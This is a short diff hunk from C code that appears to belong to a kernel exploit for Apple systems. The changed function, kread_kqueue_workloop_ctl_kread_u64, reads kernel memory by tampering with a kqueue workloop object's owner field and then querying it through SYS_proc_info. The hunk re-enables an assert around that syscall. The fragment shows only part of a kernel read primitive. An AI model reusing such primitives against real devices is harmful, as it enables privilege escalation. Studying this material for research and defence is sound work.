@@ -98,7 +98,7 @@ u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
     u64 arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
     u64 buffer = (u64)(&data);
     i32 buffersize = (i32)(sizeof(struct kqueue_dyninfo));
-//    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
+    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
     uset_u64(kqworkloop__kqwl_owner, old_kqwl_owner, kqworkloop_uaddr);
     return data.kqdi_owner;
